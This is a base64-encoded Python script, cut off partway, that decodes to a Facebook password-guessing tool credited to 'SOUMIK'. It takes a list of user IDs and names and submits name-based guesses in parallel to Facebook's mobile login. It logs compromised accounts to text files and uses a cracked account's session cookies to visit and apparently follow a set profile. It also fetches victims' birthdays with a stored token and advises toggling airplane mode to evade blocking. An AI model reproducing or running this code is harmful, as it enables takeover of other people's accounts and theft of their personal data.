#aW1wb3J0IG9zCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyByZXF1ZXN0cyAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cycpCgp0cnk6CiAgICBpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGZ1dHVyZXMgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlcycpCgp0cnk6CiAgICBpbXBvcnQgYnM0CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQoKaW1wb3J0IHJlcXVlc3RzLCBvcywgcmUsIGJzNCxwbGF0Zm9ybSwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCB0aHJlYWRpbmcsIGl0ZXJ0b29scyxiYXNlNjQsdXVpZCx6bGliCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgc2FyZnJhenNzYgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cAoKCmN0ID0gZGF0ZXRpbWUubm93KCkKbiA9IGN0Lm1vbnRoCmJ1bGFuID0gWydKYW51YXJ5JywgJ0ZlYnJ1YXJ5JywgJ01hcmNoJywgJ0FwcmlsJywgJ01heScsICdKdW5lJywgJ0p1bHknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2N0b2JlcicsICdOb3ZlbWJlcicsICdEZWNlbWJlciddCnRyeToKICAgIGlmIG4gPCAwIG9yIG4gPiAxMjoKICAgICAgICBleGl0KCkKICAgIG5UZW1wID0gbiAtIDEKZXhjZXB0IFZhbHVlRXJyb3I6CiAgICBleGl0KCkKCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQpvcCA9IGJ1bGFuW25UZW1wXQpQID0gJ1x4MWJbMTs5N20nICMgCk0gPSAnXDAzM1sxOzMxbScgIyAKSCA9ICdcMDMzWzE7MzJtJyAjIApLID0gJ1x4MWJbMTs5N20nICMgCkIgPSAnXHgxYlsxOzk3bScgIyAKVSA9ICdceDFiWzE7OTdtJyAjIApPID0gJ1x4MWJbMTs5N20nICMgCk4gPSAnXHgxYlswbScgICAgIyAKbXlfY29sb3IgPSBbCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpCmRhdGEsZGF0YTI9e30se30KYW1hbixjcCxzYWxhaD0wLDAsMAp1YmFoUCxmdWNrLHB3QmFydT1bXSxbXSxbXQpvayA9IFtdCmNwID0gW10KaWQgPSBbXQp1c2VyID0gW10KbG9vcCA9IDAKdXJsX2xvb2t1cCA9ICJodHRwczovL2xvb2t1cC1pZC5jb20vIgp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIKdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIgpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10ifQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9CmRvbmUgPSBGYWxzZQoKZGVmIGphbGFuKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKCmxvZ28gPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIgICAKCgrigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXimIXimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXigJQK4piFCuKYheKWkeKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl+KYheKWiOKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlwrimIXilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilZHilpHilpHilpHilojilojilZHimIXilojilojilojilojilZfilpHilojilojilojilojilZHilojilojilZHilojilojilZHilpHilojilojilZTilZ0K4piF4pWa4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4piF4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4pWQ4pWd4paRCuKYheKWkeKVmuKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKYheKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKWiOKWiOKVl+KWkQrimIXilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3imIXilojilojilZHilpHilZrilZDilZ3ilpHilojilojilZHilojilojilZHilojilojilZHilpHilZrilojilojilZcK4piF4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4piF4pWa4pWQ4pWd4paR4paR4paR4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWdCuKYhQrimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXimIXimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJQKIAogICAKXDAzM1swOzkzbeKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYhSDimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIUKXDAzM1swOzkxbUFVVEhPUiA6IDogU09VTUlLCiAKXDAzM1swOzkzbUZBQ0VCT09LIDogOiBzb3VtaWs5NTYKIApcMDMzWzA7OTZtR0lUSFVCIDogOiBTQVMtMDA3CiAKXDAzM1swOzk1bVRPT0xTICAgOiA6IEZJTEUgQ0xPTklORyAob25seSkKXDAzM1swOzk2beKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYhSDimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIUiIiIgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgpkZWYgaGFzaWwoT0ssY3ApOgoJaWYgbm90IGxlbihPSykgIT0gMDoKCSAgICBwYXNzCglpZiBsZW4oY3ApICE9IDA6CgkgICAgcHJpbnQoJ1xuXG4gXHgxYlsxOzkybVRPVEFMIE9LIDogXHgxYlsxOzkybSAlcyAgXHgxYlsxOzkybVNPVU1JS19PSy50eHQnICUgKEgsIFAsIHN0cihsZW4ob2spKSkpCgkgICAgcHJpbnQoJyBceDFiWzE7OTFtVE9UQUwgQ1AgOlx4MWJbMTs5MW0gICAlcyBceDFiWzE7OTFtU09VTUlLX0NQLnR4dCcgJSAoSCwgUCwgc3RyKGxlbihjcCkpKSkKCSAgICBpbnB1dCgiXHgxYlsxOzkybVBSRVNTIEVOVEVSIFRPIEJBQ0sgTUVOVSAiKQoJICAgIHNhcmZyYXooKQoKZGVmIHNhcmZyYXooKToKCgoKCiAgICAgICAgCiAgCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBpcG0gPSByZXF1ZXN0cy5nZXQodXJsX2lwKS5qc29uKCkKICAgIHRvZHogPSAnJwogICAgSVAgPSBpcG1bJ29yaWdpbiddCiAgICBwcmludAogICAgcHJpbnQoJyBbMV0gU1RBUlQgRklMRSBDTE9OSU5HJykKICAgIHByaW50KCcgWzNdIEVYSVQgJykKICAgIHByaW50KCcnKQogICAgX3NhcmZyYXpfX18gPSBpbnB1dCgnIFs/XSBDSE9PU0UgT1BUSU9OIDogJykKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMScsICcwMScpOgogICAgICAgIF9feHh4X18oKS5zYXJmcmF6eChpZCkKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMicsICcwMicpOgogICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIGRtLnB5JykKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMycsICcwMycpOgogICAgICAgIHBhc3MKCgpjbGFzcyBfX3h4eF9fOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuaWQgPSBbXQogICAgZGVmIHNhcmZyYXp4KHNlbGYsaWQpOgogIAogICAgICAgCiAgICAgIAogICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAKCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgcHJpbnQobG9nbykKICAgICAgICBzZWxmLmNudCA9IGlucHV0KCdQVVQgRklMRSBOQU1FIDogJykKICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgX19fd29ybGR3aWRlX19fID0gKCd5JykKICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ0hPT1NFIENPUlJFQ1QgT05FJyk7CiAgICAgICAgICAgIHNlbGYuc2FyZnJhengoaWQpCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6CiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3AKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJceDFiWzE7OTJtW1NvdW1pa10ge2xvb3B9fHtsZW4oc2VsZi5pZCl9IFtva11be2xlbihvayl9XSBbY3BdW3tsZW4oY3ApfV0gIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOgogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgaGVhZGVyID0gewogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICBkYXMgPSB7CiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgICAgICAgICAidWlkIjp1c2VyLAogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwKICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7CiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLAogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJvcmlnaW4iOiJodHRwczovLyIrY2Vib2ssCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLAogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH1bU291bWlrLU9LXSB7dXNlcn0gfCB7cHd9IikKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICBvcGVuKCdTb3VtaWtfT0sudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwX3R0bCA9IHNlc3Npb24uZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VzZXJ9P2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49e3Rva2Vuen0nKS5qc29uKClbJ2JpcnRoZGF5J10KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNwX3R0bC5zcGxpdCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlc1tTb3VtaWstQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpCiAgICAgICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykKICAgICAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignU291bWlrX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJwogICAgICAgICAgICAgICAgICAgICAgICBkYXkgICA9ICcnCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlc1tTb3VtaWstQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpCiAgICAgICAgICAgICAgICAgICAgb3BlbignU291bWlrX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBsb29wKz0xCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQoKICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgc3RyaW5nPSdJa3V0aScpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCkpLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQKCiAgICBkZWYgX19wbGVyX18oc2VsZik6CiAgICAgICAgcHJpbnQoJ1sxXSBDUkFDSyBXSVRIIEFVVE8gUEFTUyAnKQogICAgICAgIHByaW50KCdbMl0gQ1JBQ0sgV0lUSCBOQU1FIERJR0lUIFBBU1MnKQogICAgICAgIGNoaSA9IGlucHV0KCdcbls/XSBDSE9PU0UgOiAnKQogICAgICAgIGlmIGNoaSA9PSAnJzoKICAgICAgICAgICAgcHJpbnQoJ1xuU0VMRUNUIENPUlJFQ1QgT05FJykKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxpZiBjaGkgaW4gKCcxJywgJzAxJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzkxbVxyVVNFIEZMSUdIVCAoYWlycGxhbmUpIE1PREUgT05cMDMzWzE7OTZtIikKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM2bVRPVEFMIElEUyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtQ1JBQ0tJTkcgU1RBUlRFRC4uLi4uJykKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICB3aXRoIHNhcmZyYXpzc2IobWF4X3dvcmtlcnM9MzApIGFzIHNzYndvcmxkOgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIEJBTkxBREVTSEkgQlJBTkQgQlJPCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiNzg2MTEwIl0KICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxpZiBjaGkgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzMybVxyRU5URVIgTEFTVCBOQU1FIERJR0lUc1wwMzNbMTszMm1cbiIpCiAgICAgICAgICAgIHAxID0gaW5wdXQoJyAgTmFtZSArIDEgOiAnKQogICAgICAgICAgICBwMiA9IGlucHV0KCcgIE5hbWUgKyAyIDogJykKICAgICAgICAgICAgcDMgPSBpbnB1dCgnICBOYW1lICsgMyA6ICcpCiAgICAgICAgICAgIHA0ID0gaW5wdXQoJyAgTmFtZSArIDQgOiAnKQogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQobG9nbykKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMW1cclVTRSBGTElHSFQgKGFpcnBsYW5lKSBNT0RFIEJFRk9SRSBVU0VcMDMzWzE7MzJtIikKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzMybVRPVEFMIElEUyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzJtQ1JBQ0tJTkcgU1RBUlRFRC4uLi4uJykKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICB3aXRoIHNhcmZyYXpzc2IobWF4X3dvcmtlcnM9MzApIGFzIHNzYndvcmxkOgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIEl0J3MgQmFubGFkZXNoaSBicmFuZCBicm8uCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6C